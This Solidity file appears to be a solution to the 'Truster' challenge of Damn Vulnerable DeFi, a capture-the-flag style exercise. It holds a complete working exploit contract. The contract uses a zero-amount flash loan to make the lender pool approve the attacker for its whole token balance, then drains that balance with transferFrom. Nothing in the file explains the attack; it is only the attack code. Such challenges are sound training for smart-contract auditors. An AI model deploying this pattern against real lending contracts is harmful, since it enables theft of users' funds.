// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";

contract trusterattack {

    TrusterLenderPool pool;
    IERC20 public immutable damnValuableToken;

    constructor(address _pool,address _t){
        pool=TrusterLenderPool(_pool);
        damnValuableToken=IERC20(_t);
    }

    function attack(address attacker) public {
        uint256 bal=damnValuableToken.balanceOf(address(pool));
        bytes memory data=abi.encodeWithSignature("approve(address,uint256)",address(this),bal);
        pool.flashLoan(0,attacker,address(damnValuableToken),data);
        damnValuableToken.transferFrom(address(pool),attacker, bal);
      
    }
}